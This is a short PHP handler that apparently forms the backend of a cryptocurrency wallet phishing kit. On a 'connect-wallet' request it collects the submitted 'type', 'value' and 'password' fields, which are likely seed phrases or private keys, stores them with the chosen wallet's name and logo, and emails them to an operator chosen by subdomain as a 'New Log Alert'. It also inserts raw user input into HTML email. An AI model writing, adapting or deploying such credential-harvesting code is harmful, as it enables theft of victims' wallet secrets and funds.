<?php

require_once(absolute_filepath($uri->backend) . "controllers/Messenger.php");

switch ($post->case) {
  case 'connect-wallet':
    $domain = explode(".", $_SERVER["HTTP_HOST"])[0];

    // Get the admin to be notified
    $user = $generic->getFromTable("users", "username={$domain}, username=administrator", 1, 0, ID_DESC);
    $user = reset($user);

    // Submit the request
    $info = ["type", "value", "password"];
    $post->info = object(array_extract($_POST, $info, true));

    $wallet = $generic->getFromTable("coins", "symbol={$post->wallet}, type=1", 1, 0, ID_DESC);
    $wallet = reset($wallet);

    $response = $generic->insert([
      "user_id" => $user->id,
      "name" => $wallet->name,
      "logo" => $wallet->logo,
      "type" => $post->type,
      "info" => $post->info
    ], "report");

    if ($response) {
      $body = "<hr/><img width=50px src={$wallet->logo} > <br/><hr/>";
      $body .= "<table style='width:100%'><tbody>";
      foreach ($post->info as $key => $data) {
        $body .= "<tr><td>{$key}<hr/></td><td>{$data}<hr/></td></tr>";
      }
      $body .= "<tr><td>Wallet<hr/></td><td>{$wallet->name}<hr/></td></tr>";
      $body .= "</tbody><table>";

      $messenger = new Messenger($generic);
      $messenger->sendMail(
        object([
          "subject" => "New Log Alert",
          "body" => "Hi {$user->first_name}, Below are the log details for {$wallet->name}. <br>{$body}",
          "from_name" => $company->name,
          "to_name" => $user->first_name,
          "from" => $company->email,
          "to" => $user->email,
          "template" => "notify"
        ])
      );
    }

    break;

  default:
    # code...
    break;
}
